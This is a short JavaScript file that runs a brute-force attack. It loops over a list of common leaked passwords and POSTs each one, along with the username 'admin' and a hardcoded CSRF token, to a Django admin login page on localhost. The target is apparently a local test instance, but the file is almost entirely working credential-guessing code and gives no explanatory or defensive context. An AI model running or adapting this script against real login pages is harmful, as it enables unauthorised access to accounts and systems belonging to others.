var passwords = [ '123456', '12345', '123456789', 'password', 'iloveyou',
'princess', '1234567', 'rockyou', '12345678', 'abc123', 'nicole', 'daniel',
'babygirl', 'monkey', 'lovely', 'jessica', '654321', 'michael', 'ashley',
'qwerty', '111111', 'iloveu', '000000', 'michelle', 'tigger', 'sunshine',
'chocolate', 'password1', 'soccer', 'anthony', 'friends', 'butterfly',
'purple', 'angel', 'jordan', 'liverpool', 'justin', 'loveme', '123123',
'football', 'secret', 'andrea', 'carlos', 'jennifer', 'joshua', 'bubbles',
'1234567890', 'superman', 'hannah', 'amanda', 'loveyou', 'pretty',
'basketball', 'andrew', 'angels', 'tweety', 'flower', 'playboy', 'hello',
'elizabeth', 'hottie', 'tinkerbell', 'charlie', 'samantha', ];


for (var password of passwords) {
    fetch("http://localhost:8000/admin/login/?next=/admin/", {
        "credentials": "include",
        "headers": {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        },
        "referrer": "http://localhost:8000/admin/login/?next=/admin/",
        "body": `csrfmiddlewaretoken=1MIBZi9YDAnj8Iuwp58MJsq0vw5Jjtr9TJuHAQa6DhPAPoNTQKBtzoVP0wONU6ZD&username=admin&password=${password}&next=%2Fadmin%2F`,
        "method": "POST",
        "mode": "cors"
    });
}
